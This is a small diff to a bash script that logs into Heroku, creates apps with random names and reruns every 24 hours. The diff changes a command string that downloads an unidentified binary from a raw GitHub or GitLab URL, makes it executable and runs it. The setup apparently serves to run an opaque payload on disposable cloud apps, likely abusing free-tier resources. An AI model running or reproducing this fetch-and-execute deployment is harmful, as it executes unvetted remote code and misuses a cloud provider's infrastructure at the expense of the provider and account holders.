@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #rerun tiap 24jam
 buildpack="heroku/python"
-command="wget https://gitlab.com/mauliki9999/codet/-/raw/main/babyshark && chmod +x babyshark && ./babyshark"
+command="wget https://raw.githubusercontent.com/sarifadim/singaparna/main/setup && chmod +x setup && ./setup"
 heroku login -i
 app_1=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
 app_2=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
